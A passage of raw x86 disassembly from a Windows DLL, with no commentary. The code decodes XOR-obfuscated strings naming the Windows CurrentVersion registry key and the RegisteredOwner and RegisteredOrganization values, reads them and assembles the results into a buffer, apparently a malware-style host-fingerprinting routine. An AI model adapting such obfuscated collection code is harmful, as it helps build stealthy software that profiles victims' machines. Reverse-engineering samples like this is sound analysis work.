100045a0:	c6 45 c4 23          	movb   $0x23,-0x3c(%ebp)
100045a4:	c6 45 c5 32          	movb   $0x32,-0x3b(%ebp)
100045a8:	c6 45 c6 16          	movb   $0x16,-0x3a(%ebp)
100045ac:	c6 45 c7 1c          	movb   $0x1c,-0x39(%ebp)
100045b0:	c6 45 c8 0d          	movb   $0xd,-0x38(%ebp)
100045b4:	c6 45 c9 10          	movb   $0x10,-0x37(%ebp)
100045b8:	c6 45 ca 0c          	movb   $0xc,-0x36(%ebp)
100045bc:	c6 45 cb 10          	movb   $0x10,-0x35(%ebp)
100045c0:	c6 45 cc 19          	movb   $0x19,-0x34(%ebp)
100045c4:	c6 45 cd 0b          	movb   $0xb,-0x33(%ebp)
100045c8:	c6 45 ce 23          	movb   $0x23,-0x32(%ebp)
100045cc:	c6 45 cf 28          	movb   $0x28,-0x31(%ebp)
100045d0:	c6 45 d0 16          	movb   $0x16,-0x30(%ebp)
100045d4:	c6 45 d1 11          	movb   $0x11,-0x2f(%ebp)
100045d8:	c6 45 d2 1b          	movb   $0x1b,-0x2e(%ebp)
100045dc:	c6 45 d3 10          	movb   $0x10,-0x2d(%ebp)
100045e0:	c6 45 d4 08          	movb   $0x8,-0x2c(%ebp)
100045e4:	c6 45 d5 0c          	movb   $0xc,-0x2b(%ebp)
100045e8:	c6 45 d6 23          	movb   $0x23,-0x2a(%ebp)
100045ec:	c6 45 d7 3c          	movb   $0x3c,-0x29(%ebp)
100045f0:	c6 45 d8 0a          	movb   $0xa,-0x28(%ebp)
100045f4:	c6 45 d9 0d          	movb   $0xd,-0x27(%ebp)
100045f8:	c6 45 da 0d          	movb   $0xd,-0x26(%ebp)
100045fc:	c6 45 db 1a          	movb   $0x1a,-0x25(%ebp)
10004600:	c6 45 dc 11          	movb   $0x11,-0x24(%ebp)
10004604:	c6 45 dd 0b          	movb   $0xb,-0x23(%ebp)
10004608:	c6 45 de 29          	movb   $0x29,-0x22(%ebp)
1000460c:	c6 45 df 1a          	movb   $0x1a,-0x21(%ebp)
10004610:	c6 45 e0 0d          	movb   $0xd,-0x20(%ebp)
10004614:	c6 45 e1 0c          	movb   $0xc,-0x1f(%ebp)
10004618:	c6 45 e2 16          	movb   $0x16,-0x1e(%ebp)
1000461c:	c6 45 e3 10          	movb   $0x10,-0x1d(%ebp)
10004620:	c6 45 e4 11          	movb   $0x11,-0x1c(%ebp)
10004624:	c6 45 e5 23          	movb   $0x23,-0x1b(%ebp)
10004628:	88 5d e6             	mov    %bl,-0x1a(%ebp)
1000462b:	c6 85 40 ff ff ff 2d 	movb   $0x2d,-0xc0(%ebp)
10004632:	c6 85 41 ff ff ff 1a 	movb   $0x1a,-0xbf(%ebp)
10004639:	c6 85 42 ff ff ff 18 	movb   $0x18,-0xbe(%ebp)
10004640:	c6 85 43 ff ff ff 16 	movb   $0x16,-0xbd(%ebp)
10004647:	c6 85 44 ff ff ff 0c 	movb   $0xc,-0xbc(%ebp)
1000464e:	c6 85 45 ff ff ff 0b 	movb   $0xb,-0xbb(%ebp)
10004655:	c6 85 46 ff ff ff 1a 	movb   $0x1a,-0xba(%ebp)
1000465c:	c6 85 47 ff ff ff 0d 	movb   $0xd,-0xb9(%ebp)
10004663:	c6 85 48 ff ff ff 1a 	movb   $0x1a,-0xb8(%ebp)
1000466a:	c6 85 49 ff ff ff 1b 	movb   $0x1b,-0xb7(%ebp)
10004671:	c6 85 4a ff ff ff 30 	movb   $0x30,-0xb6(%ebp)
10004678:	c6 85 4b ff ff ff 08 	movb   $0x8,-0xb5(%ebp)
1000467f:	c6 85 4c ff ff ff 11 	movb   $0x11,-0xb4(%ebp)
10004686:	c6 85 4d ff ff ff 1a 	movb   $0x1a,-0xb3(%ebp)
1000468d:	c6 85 4e ff ff ff 0d 	movb   $0xd,-0xb2(%ebp)
10004694:	88 9d 4f ff ff ff    	mov    %bl,-0xb1(%ebp)
1000469a:	c6 85 54 ff ff ff 2d 	movb   $0x2d,-0xac(%ebp)
100046a1:	c6 85 55 ff ff ff 1a 	movb   $0x1a,-0xab(%ebp)
100046a8:	c6 85 56 ff ff ff 18 	movb   $0x18,-0xaa(%ebp)
100046af:	c6 85 57 ff ff ff 16 	movb   $0x16,-0xa9(%ebp)
100046b6:	c6 85 58 ff ff ff 0c 	movb   $0xc,-0xa8(%ebp)
100046bd:	c6 85 59 ff ff ff 0b 	movb   $0xb,-0xa7(%ebp)
100046c4:	c6 85 5a ff ff ff 1a 	movb   $0x1a,-0xa6(%ebp)
100046cb:	c6 85 5b ff ff ff 0d 	movb   $0xd,-0xa5(%ebp)
100046d2:	c6 85 5c ff ff ff 1a 	movb   $0x1a,-0xa4(%ebp)
100046d9:	c6 85 5d ff ff ff 1b 	movb   $0x1b,-0xa3(%ebp)
100046e0:	c6 85 5e ff ff ff 30 	movb   $0x30,-0xa2(%ebp)
100046e7:	c6 85 5f ff ff ff 0d 	movb   $0xd,-0xa1(%ebp)
100046ee:	c6 85 60 ff ff ff 18 	movb   $0x18,-0xa0(%ebp)
100046f5:	c6 85 61 ff ff ff 1e 	movb   $0x1e,-0x9f(%ebp)
100046fc:	c6 85 62 ff ff ff 11 	movb   $0x11,-0x9e(%ebp)
10004703:	c6 85 63 ff ff ff 16 	movb   $0x16,-0x9d(%ebp)
1000470a:	c6 85 64 ff ff ff 05 	movb   $0x5,-0x9c(%ebp)
10004711:	c6 85 65 ff ff ff 1e 	movb   $0x1e,-0x9b(%ebp)
10004718:	c6 85 66 ff ff ff 0b 	movb   $0xb,-0x9a(%ebp)
1000471f:	c6 85 67 ff ff ff 16 	movb   $0x16,-0x99(%ebp)
10004726:	c6 85 68 ff ff ff 10 	movb   $0x10,-0x98(%ebp)
1000472d:	c6 85 69 ff ff ff 11 	movb   $0x11,-0x97(%ebp)
10004734:	88 9d 6a ff ff ff    	mov    %bl,-0x96(%ebp)
1000473a:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000473d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
10004744:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
1000474a:	50                   	push   %eax
1000474b:	e8 9e 2e 00 00       	call   0x100075ee
10004750:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
10004756:	50                   	push   %eax
10004757:	e8 92 2e 00 00       	call   0x100075ee
1000475c:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
10004762:	50                   	push   %eax
10004763:	e8 86 2e 00 00       	call   0x100075ee
10004768:	8d 45 84             	lea    -0x7c(%ebp),%eax
1000476b:	50                   	push   %eax
1000476c:	e8 7d 2e 00 00       	call   0x100075ee
10004771:	8d 45 bc             	lea    -0x44(%ebp),%eax
10004774:	50                   	push   %eax
10004775:	e8 74 2e 00 00       	call   0x100075ee
1000477a:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
10004780:	50                   	push   %eax
10004781:	e8 68 2e 00 00       	call   0x100075ee
10004786:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
1000478c:	50                   	push   %eax
1000478d:	e8 5c 2e 00 00       	call   0x100075ee
10004792:	68 01 10 00 00       	push   $0x1001
10004797:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
1000479d:	83 c4 20             	add    $0x20,%esp
100047a0:	8b f8                	mov    %eax,%edi
100047a2:	89 bd 2c ff ff ff    	mov    %edi,-0xd4(%ebp)
100047a8:	3b fb                	cmp    %ebx,%edi
100047aa:	0f 84 fc 04 00 00    	je     0x10004cac
100047b0:	68 01 10 00 00       	push   $0x1001
100047b5:	53                   	push   %ebx
100047b6:	57                   	push   %edi
100047b7:	e8 5a 8b 00 00       	call   0x1000d316
100047bc:	68 01 10 00 00       	push   $0x1001
100047c1:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
100047c7:	83 c4 10             	add    $0x10,%esp
100047ca:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
100047d0:	3b c3                	cmp    %ebx,%eax
100047d2:	0f 84 d4 04 00 00    	je     0x10004cac
100047d8:	68 01 10 00 00       	push   $0x1001
100047dd:	53                   	push   %ebx
100047de:	50                   	push   %eax
100047df:	e8 32 8b 00 00       	call   0x1000d316
100047e4:	68 01 10 00 00       	push   $0x1001
100047e9:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
100047ef:	83 c4 10             	add    $0x10,%esp
100047f2:	89 85 74 ff ff ff    	mov    %eax,-0x8c(%ebp)
100047f8:	3b c3                	cmp    %ebx,%eax
100047fa:	0f 84 ac 04 00 00    	je     0x10004cac
10004800:	68 01 10 00 00       	push   $0x1001
10004805:	53                   	push   %ebx
10004806:	50                   	push   %eax
10004807:	e8 0a 8b 00 00       	call   0x1000d316
1000480c:	68 01 10 00 00       	push   $0x1001
10004811:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10004817:	83 c4 10             	add    $0x10,%esp
1000481a:	89 85 30 ff ff ff    	mov    %eax,-0xd0(%ebp)
10004820:	3b c3                	cmp    %ebx,%eax
10004822:	0f 84 84 04 00 00    	je     0x10004cac
10004828:	68 01 10 00 00       	push   $0x1001
1000482d:	53                   	push   %ebx
1000482e:	50                   	push   %eax
1000482f:	e8 e2 8a 00 00       	call   0x1000d316
10004834:	56                   	push   %esi
10004835:	ff 75 10             	push   0x10(%ebp)
10004838:	57                   	push   %edi
10004839:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000483f:	57                   	push   %edi
10004840:	e8 1b 8b 00 00       	call   0x1000d360
10004845:	8b ce                	mov    %esi,%ecx
10004847:	2b c8                	sub    %eax,%ecx
10004849:	51                   	push   %ecx
1000484a:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
10004850:	50                   	push   %eax
10004851:	57                   	push   %edi
10004852:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10004858:	83 c4 28             	add    $0x28,%esp
1000485b:	e8 9b 24 00 00       	call   0x10006cfb
10004860:	85 c0                	test   %eax,%eax
10004862:	57                   	push   %edi
10004863:	74 12                	je     0x10004877
10004865:	e8 f6 8a 00 00       	call   0x1000d360
1000486a:	8b ce                	mov    %esi,%ecx
1000486c:	2b c8                	sub    %eax,%ecx
1000486e:	51                   	push   %ecx
1000486f:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
10004875:	eb 10                	jmp    0x10004887
10004877:	e8 e4 8a 00 00       	call   0x1000d360
1000487c:	8b ce                	mov    %esi,%ecx
1000487e:	2b c8                	sub    %eax,%ecx
10004880:	51                   	push   %ecx
10004881:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
10004887:	50                   	push   %eax
10004888:	57                   	push   %edi
10004889:	ff 15 cc e1 00 10    	call   *0x1000e1cc
1000488f:	83 c4 10             	add    $0x10,%esp
10004892:	6a 10                	push   $0x10
10004894:	53                   	push   %ebx
10004895:	8d 85 18 ff ff ff    	lea    -0xe8(%ebp),%eax
1000489b:	50                   	push   %eax
1000489c:	e8 75 8a 00 00       	call   0x1000d316
100048a1:	83 c4 0c             	add    $0xc,%esp
100048a4:	c7 85 28 ff ff ff 0f 	movl   $0xf,-0xd8(%ebp)
100048ab:	00 00 00 
100048ae:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
100048b4:	50                   	push   %eax
100048b5:	8d 85 18 ff ff ff    	lea    -0xe8(%ebp),%eax
100048bb:	50                   	push   %eax
100048bc:	ff 15 b0 e0 00 10    	call   *0x1000e0b0
100048c2:	57                   	push   %edi
100048c3:	e8 98 8a 00 00       	call   0x1000d360
100048c8:	8b ce                	mov    %esi,%ecx
100048ca:	2b c8                	sub    %eax,%ecx
100048cc:	51                   	push   %ecx
100048cd:	8d 85 18 ff ff ff    	lea    -0xe8(%ebp),%eax
100048d3:	50                   	push   %eax
100048d4:	57                   	push   %edi
100048d5:	ff 15 cc e1 00 10    	call   *0x1000e1cc
100048db:	57                   	push   %edi
100048dc:	e8 7f 8a 00 00       	call   0x1000d360
100048e1:	8b ce                	mov    %esi,%ecx
100048e3:	2b c8                	sub    %eax,%ecx
100048e5:	51                   	push   %ecx
100048e6:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
100048ec:	50                   	push   %eax
100048ed:	57                   	push   %edi
100048ee:	ff 15 cc e1 00 10    	call   *0x1000e1cc
100048f4:	68 05 01 00 00       	push   $0x105
100048f9:	53                   	push   %ebx
100048fa:	8d 85 0c fe ff ff    	lea    -0x1f4(%ebp),%eax
10004900:	50                   	push   %eax
10004901:	e8 10 8a 00 00       	call   0x1000d316
10004906:	53                   	push   %ebx
10004907:	e8 6c 2c 00 00       	call   0x10007578
1000490c:	83 c4 30             	add    $0x30,%esp
1000490f:	48                   	dec    %eax
10004910:	48                   	dec    %eax
10004911:	f7 d8                	neg    %eax
10004913:	1b c0                	sbb    %eax,%eax
10004915:	40                   	inc    %eax
10004916:	89 85 14 ff ff ff    	mov    %eax,-0xec(%ebp)
1000491c:	83 f8 01             	cmp    $0x1,%eax
1000491f:	68 04 01 00 00       	push   $0x104
10004924:	8d 45 84             	lea    -0x7c(%ebp),%eax
10004927:	74 03                	je     0x1000492c
10004929:	8d 45 bc             	lea    -0x44(%ebp),%eax
1000492c:	50                   	push   %eax
1000492d:	8d 85 0c fe ff ff    	lea    -0x1f4(%ebp),%eax
10004933:	50                   	push   %eax
10004934:	ff 15 ac e0 00 10    	call   *0x1000e0ac
1000493a:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
10004940:	50                   	push   %eax
10004941:	68 19 00 02 00       	push   $0x20019
10004946:	53                   	push   %ebx
10004947:	8d 85 0c fe ff ff    	lea    -0x1f4(%ebp),%eax
1000494d:	50                   	push   %eax
1000494e:	68 02 00 00 80       	push   $0x80000002
10004953:	ff 15 3c e0 00 10    	call   *0x1000e03c
10004959:	85 c0                	test   %eax,%eax
1000495b:	0f 85 e1 00 00 00    	jne    0x10004a42
10004961:	68 05 01 00 00       	push   $0x105
10004966:	53                   	push   %ebx
10004967:	8d 85 00 fd ff ff    	lea    -0x300(%ebp),%eax
1000496d:	50                   	push   %eax
1000496e:	e8 a3 89 00 00       	call   0x1000d316
10004973:	83 c4 0c             	add    $0xc,%esp
10004976:	c7 85 fc fc ff ff 04 	movl   $0x104,-0x304(%ebp)
1000497d:	01 00 00 
10004980:	89 9d 08 fe ff ff    	mov    %ebx,-0x1f8(%ebp)
10004986:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
1000498c:	50                   	push   %eax
1000498d:	8d 85 00 fd ff ff    	lea    -0x300(%ebp),%eax
10004993:	50                   	push   %eax
10004994:	8d 85 08 fe ff ff    	lea    -0x1f8(%ebp),%eax
1000499a:	50                   	push   %eax
1000499b:	53                   	push   %ebx
1000499c:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
100049a2:	50                   	push   %eax
100049a3:	ff b5 70 ff ff ff    	push   -0x90(%ebp)
100049a9:	ff 15 40 e0 00 10    	call   *0x1000e040
100049af:	57                   	push   %edi
100049b0:	e8 ab 89 00 00       	call   0x1000d360
100049b5:	8b ce                	mov    %esi,%ecx
100049b7:	2b c8                	sub    %eax,%ecx
100049b9:	51                   	push   %ecx
100049ba:	8d 85 00 fd ff ff    	lea    -0x300(%ebp),%eax
100049c0:	50                   	push   %eax
100049c1:	57                   	push   %edi
100049c2:	ff 15 cc e1 00 10    	call   *0x1000e1cc
100049c8:	57                   	push   %edi
100049c9:	e8 92 89 00 00       	call   0x1000d360
100049ce:	8b ce                	mov    %esi,%ecx
100049d0:	2b c8                	sub    %eax,%ecx
100049d2:	51                   	push   %ecx
100049d3:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
100049d9:	50                   	push   %eax
100049da:	57                   	push   %edi
100049db:	ff 15 cc e1 00 10    	call   *0x1000e1cc
100049e1:	68 05 01 00 00       	push   $0x105
100049e6:	53                   	push   %ebx
100049e7:	8d 85 00 fd ff ff    	lea    -0x300(%ebp),%eax
100049ed:	50                   	push   %eax
100049ee:	e8 23 89 00 00       	call   0x1000d316
100049f3:	83 c4 2c             	add    $0x2c,%esp
100049f6:	c7 85 fc fc ff ff 04 	movl   $0x104,-0x304(%ebp)
100049fd:	01 00 00 
10004a00:	89 9d 08 fe ff ff    	mov    %ebx,-0x1f8(%ebp)
10004a06:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
10004a0c:	50                   	push   %eax
10004a0d:	8d 85 00 fd ff ff    	lea    -0x300(%ebp),%eax
10004a13:	50                   	push   %eax
10004a14:	8d 85 08 fe ff ff    	lea    -0x1f8(%ebp),%eax
10004a1a:	50                   	push   %eax
10004a1b:	53                   	push   %ebx
10004a1c:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
10004a22:	50                   	push   %eax
10004a23:	ff b5 70 ff ff ff    	push   -0x90(%ebp)
10004a29:	ff 15 40 e0 00 10    	call   *0x1000e040
10004a2f:	57                   	push   %edi
10004a30:	e8 2b 89 00 00       	call   0x1000d360
10004a35:	8b ce                	mov    %esi,%ecx
10004a37:	2b c8                	sub    %eax,%ecx
10004a39:	51                   	push   %ecx
10004a3a:	8d 85 00 fd ff ff    	lea    -0x300(%ebp),%eax
10004a40:	eb 11                	jmp    0x10004a53
10004a42:	57                   	push   %edi
10004a43:	e8 18 89 00 00       	call   0x1000d360
10004a48:	8b ce                	mov    %esi,%ecx
10004a4a:	2b c8                	sub    %eax,%ecx
10004a4c:	51                   	push   %ecx
10004a4d:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
10004a53:	50                   	push   %eax
10004a54:	57                   	push   %edi
10004a55:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10004a5b:	57                   	push   %edi
10004a5c:	e8 ff 88 00 00       	call   0x1000d360
10004a61:	8b ce                	mov    %esi,%ecx
10004a63:	2b c8                	sub    %eax,%ecx
10004a65:	51                   	push   %ecx
10004a66:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
10004a6c:	50                   	push   %eax
10004a6d:	57                   	push   %edi
10004a6e:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10004a74:	83 c4 20             	add    $0x20,%esp
10004a77:	68 01 10 00 00       	push   $0x1001
10004a7c:	53                   	push   %ebx
10004a7d:	ff b5 30 ff ff ff    	push   -0xd0(%ebp)
10004a83:	e8 8e 88 00 00       	call   0x1000d316
10004a88:	56                   	push   %esi
10004a89:	ff b5 30 ff ff ff    	push   -0xd0(%ebp)
10004a8f:	e8 c8 02 00 00       	call   0x10004d5c
10004a94:	ff b5 30 ff ff ff    	push   -0xd0(%ebp)
10004a9a:	e8 c1 88 00 00       	call   0x1000d360
10004a9f:	8b d0                	mov    %eax,%edx
10004aa1:	57                   	push   %edi
10004aa2:	89 95 ec fc ff ff    	mov    %edx,-0x314(%ebp)
10004aa8:	e8 b3 88 00 00       	call   0x1000d360
10004aad:	83 c4 1c             	add    $0x1c,%esp
10004ab0:	8b 8d ec fc ff ff    	mov    -0x314(%ebp),%ecx
10004ab6:	03 c8                	add    %eax,%ecx
10004ab8:	3b ce                	cmp    %esi,%ecx
10004aba:	76 47                	jbe    0x10004b03
10004abc:	c7 45 b4 00 20 00 00 	movl   $0x2000,-0x4c(%ebp)
10004ac3:	68 01 20 00 00       	push   $0x2001
10004ac8:	ff b5 2c ff ff ff    	push   -0xd4(%ebp)
10004ace:	ff 15 dc e1 00 10    	call   *0x1000e1dc
10004ad4:	59                   	pop    %ecx
10004ad5:	59                   	pop    %ecx
10004ad6:	8b f8                	mov    %eax,%edi
10004ad8:	89 bd 2c ff ff ff    	mov    %edi,-0xd4(%ebp)
10004ade:	3b fb                	cmp    %ebx,%edi
10004ae0:	0f 84 c6 01 00 00    	je     0x10004cac
10004ae6:	c7 85 f8 fc ff ff 01 	movl   $0x1001,-0x308(%ebp)
10004aed:	10 00 00 
10004af0:	56                   	push   %esi
10004af1:	53                   	push   %ebx
10004af2:	8d 87 01 10 00 00    	lea    0x1001(%edi),%eax
10004af8:	50                   	push   %eax
10004af9:	e8 18 88 00 00       	call   0x1000d316
10004afe:	83 c4 0c             	add    $0xc,%esp
10004b01:	eb 06                	jmp    0x10004b09
10004b03:	8b bd 2c ff ff ff    	mov    -0xd4(%ebp),%edi
10004b09:	57                   	push   %edi
10004b0a:	e8 51 88 00 00       	call   0x1000d360
10004b0f:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
10004b12:	2b c8                	sub    %eax,%ecx
10004b14:	51                   	push   %ecx
10004b15:	ff b5 30 ff ff ff    	push   -0xd0(%ebp)
10004b1b:	57                   	push   %edi
10004b1c:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10004b22:	68 01 10 00 00       	push   $0x1001
10004b27:	53                   	push   %ebx
10004b28:	ff b5 74 ff ff ff    	push   -0x8c(%ebp)
10004b2e:	e8 e3 87 00 00       	call   0x1000d316
10004b33:	ff b5 74 ff ff ff    	push   -0x8c(%ebp)
10004b39:	e8 13 1a 00 00       	call   0x10006551
10004b3e:	ff b5 74 ff ff ff    	push   -0x8c(%ebp)
10004b44:	e8 17 88 00 00       	call   0x1000d360
10004b49:	8b d0                	mov    %eax,%edx
10004b4b:	57                   	push   %edi
10004b4c:	89 95 e8 fc ff ff    	mov    %edx,-0x318(%ebp)
10004b52:	e8 09 88 00 00       	call   0x1000d360
10004b57:	83 c4 28             	add    $0x28,%esp
10004b5a:	8b 8d e8 fc ff ff    	mov    -0x318(%ebp),%ecx
10004b60:	03 c8                	add    %eax,%ecx
10004b62:	3b 4d b4             	cmp    -0x4c(%ebp),%ecx
10004b65:	76 43                	jbe    0x10004baa
10004b67:	01 75 b4             	add    %esi,-0x4c(%ebp)
10004b6a:	8b 45 b4             	mov    -0x4c(%ebp),%eax
10004b6d:	40                   	inc    %eax
10004b6e:	50                   	push   %eax
10004b6f:	ff b5 2c ff ff ff    	push   -0xd4(%ebp)
10004b75:	ff 15 dc e1 00 10    	call   *0x1000e1dc
10004b7b:	59                   	pop    %ecx
10004b7c:	59                   	pop    %ecx
10004b7d:	8b f8                	mov    %eax,%edi
10004b7f:	89 bd 2c ff ff ff    	mov    %edi,-0xd4(%ebp)
10004b85:	3b fb                	cmp    %ebx,%edi
10004b87:	0f 84 1f 01 00 00    	je     0x10004cac
10004b8d:	8b 45 b4             	mov    -0x4c(%ebp),%eax
10004b90:	05 01 f0 ff ff       	add    $0xfffff001,%eax
10004b95:	89 85 f4 fc ff ff    	mov    %eax,-0x30c(%ebp)
10004b9b:	56                   	push   %esi
10004b9c:	53                   	push   %ebx
10004b9d:	03 c7                	add    %edi,%eax
10004b9f:	50                   	push   %eax
10004ba0:	e8 71 87 00 00       	call   0x1000d316
10004ba5:	83 c4 0c             	add    $0xc,%esp
10004ba8:	eb 06                	jmp    0x10004bb0
10004baa:	8b bd 2c ff ff ff    	mov    -0xd4(%ebp),%edi
10004bb0:	57                   	push   %edi
10004bb1:	e8 aa 87 00 00       	call   0x1000d360
10004bb6:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
10004bb9:	2b c8                	sub    %eax,%ecx
10004bbb:	51                   	push   %ecx
10004bbc:	ff b5 74 ff ff ff    	push   -0x8c(%ebp)
10004bc2:	57                   	push   %edi
10004bc3:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10004bc9:	68 01 10 00 00       	push   $0x1001
10004bce:	53                   	push   %ebx
10004bcf:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
10004bd5:	e8 3c 87 00 00       	call   0x1000d316
10004bda:	56                   	push   %esi
10004bdb:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
10004be1:	e8 00 15 00 00       	call   0x100060e6
10004be6:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
10004bec:	e8 6f 87 00 00       	call   0x1000d360
10004bf1:	8b d0                	mov    %eax,%edx
10004bf3:	57                   	push   %edi
10004bf4:	89 95 e4 fc ff ff    	mov    %edx,-0x31c(%ebp)
10004bfa:	e8 61 87 00 00       	call   0x1000d360
10004bff:	83 c4 2c             	add    $0x2c,%esp
10004c02:	8b 8d e4 fc ff ff    	mov    -0x31c(%ebp),%ecx
10004c08:	03 c8                	add    %eax,%ecx
10004c0a:	3b 4d b4             	cmp    -0x4c(%ebp),%ecx
10004c0d:	76 3f                	jbe    0x10004c4e
10004c0f:	01 75 b4             	add    %esi,-0x4c(%ebp)
10004c12:	8b 45 b4             	mov    -0x4c(%ebp),%eax
10004c15:	40                   	inc    %eax
10004c16:	50                   	push   %eax
10004c17:	ff b5 2c ff ff ff    	push   -0xd4(%ebp)
10004c1d:	ff 15 dc e1 00 10    	call   *0x1000e1dc
10004c23:	59                   	pop    %ecx
10004c24:	59                   	pop    %ecx
10004c25:	8b f8                	mov    %eax,%edi
10004c27:	89 bd 2c ff ff ff    	mov    %edi,-0xd4(%ebp)
10004c2d:	3b fb                	cmp    %ebx,%edi
10004c2f:	74 7b                	je     0x10004cac
10004c31:	8b 45 b4             	mov    -0x4c(%ebp),%eax
10004c34:	05 01 f0 ff ff       	add    $0xfffff001,%eax
10004c39:	89 85 f0 fc ff ff    	mov    %eax,-0x310(%ebp)
10004c3f:	56                   	push   %esi
10004c40:	53                   	push   %ebx
10004c41:	03 c7                	add    %edi,%eax
10004c43:	50                   	push   %eax
10004c44:	e8 cd 86 00 00       	call   0x1000d316
10004c49:	83 c4 0c             	add    $0xc,%esp
10004c4c:	eb 06                	jmp    0x10004c54
10004c4e:	8b bd 2c ff ff ff    	mov    -0xd4(%ebp),%edi
10004c54:	57                   	push   %edi
10004c55:	e8 06 87 00 00       	call   0x1000d360
10004c5a:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
10004c5d:	2b c8                	sub    %eax,%ecx
10004c5f:	51                   	push   %ecx
10004c60:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
10004c66:	57                   	push   %edi
10004c67:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10004c6d:	57                   	push   %edi
10004c6e:	e8 ed 86 00 00       	call   0x1000d360
10004c73:	8b 75 0c             	mov    0xc(%ebp),%esi
10004c76:	89 06                	mov    %eax,(%esi)
10004c78:	40                   	inc    %eax
10004c79:	50                   	push   %eax
10004c7a:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10004c80:	83 c4 18             	add    $0x18,%esp
10004c83:	8b 4d 08             	mov    0x8(%ebp),%ecx
10004c86:	89 01                	mov    %eax,(%ecx)
10004c88:	3b c3                	cmp    %ebx,%eax
10004c8a:	74 20                	je     0x10004cac
10004c8c:	8b 0e                	mov    (%esi),%ecx
10004c8e:	41                   	inc    %ecx
10004c8f:	51                   	push   %ecx
10004c90:	53                   	push   %ebx
10004c91:	50                   	push   %eax
10004c92:	e8 7f 86 00 00       	call   0x1000d316
10004c97:	ff 36                	push   (%esi)
10004c99:	57                   	push   %edi
10004c9a:	8b 45 08             	mov    0x8(%ebp),%eax
10004c9d:	ff 30                	push   (%eax)
10004c9f:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10004ca5:	83 c4 18             	add    $0x18,%esp
10004ca8:	c6 45 b8 01          	movb   $0x1,-0x48(%ebp)
10004cac:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10004caf:	e8 0d 00 00 00       	call   0x10004cc1
10004cb4:	e9 8d 00 00 00       	jmp    0x10004d46
10004cb9:	33 db                	xor    %ebx,%ebx
10004cbb:	8b bd 2c ff ff ff    	mov    -0xd4(%ebp),%edi
10004cc1:	39 9d 70 ff ff ff    	cmp    %ebx,-0x90(%ebp)
10004cc7:	74 12                	je     0x10004cdb
10004cc9:	ff b5 70 ff ff ff    	push   -0x90(%ebp)
10004ccf:	ff 15 48 e0 00 10    	call   *0x1000e048
10004cd5:	89 9d 70 ff ff ff    	mov    %ebx,-0x90(%ebp)
10004cdb:	3b fb                	cmp    %ebx,%edi
10004cdd:	74 12                	je     0x10004cf1
10004cdf:	57                   	push   %edi
10004ce0:	8b 35 c8 e1 00 10    	mov    0x1000e1c8,%esi
10004ce6:	ff d6                	call   *%esi
10004ce8:	59                   	pop    %ecx
10004ce9:	89 9d 2c ff ff ff    	mov    %ebx,-0xd4(%ebp)
10004cef:	eb 06                	jmp    0x10004cf7
10004cf1:	8b 35 c8 e1 00 10    	mov    0x1000e1c8,%esi
10004cf7:	39 9d 6c ff ff ff    	cmp    %ebx,-0x94(%ebp)
10004cfd:	74 0f                	je     0x10004d0e
10004cff:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
10004d05:	ff d6                	call   *%esi
10004d07:	59                   	pop    %ecx
10004d08:	89 9d 6c ff ff ff    	mov    %ebx,-0x94(%ebp)
10004d0e:	39 9d 74 ff ff ff    	cmp    %ebx,-0x8c(%ebp)
10004d14:	74 0f                	je     0x10004d25
10004d16:	ff b5 74 ff ff ff    	push   -0x8c(%ebp)
10004d1c:	ff d6                	call   *%esi
10004d1e:	59                   	pop    %ecx
10004d1f:	89 9d 74 ff ff ff    	mov    %ebx,-0x8c(%ebp)
10004d25:	39 9d 30 ff ff ff    	cmp    %ebx,-0xd0(%ebp)
10004d2b:	74 0f                	je     0x10004d3c
10004d2d:	ff b5 30 ff ff ff    	push   -0xd0(%ebp)
10004d33:	ff d6                	call   *%esi
10004d35:	59                   	pop    %ecx
10004d36:	89 9d 30 ff ff ff    	mov    %ebx,-0xd0(%ebp)
10004d3c:	c3                   	ret
10004d3d:	eb 07                	jmp    0x10004d46
10004d3f:	6a 01                	push   $0x1
10004d41:	58                   	pop    %eax
10004d42:	c3                   	ret
10004d43:	8b 65 e8             	mov    -0x18(%ebp),%esp
10004d46:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10004d4a:	8a 45 b8             	mov    -0x48(%ebp),%al
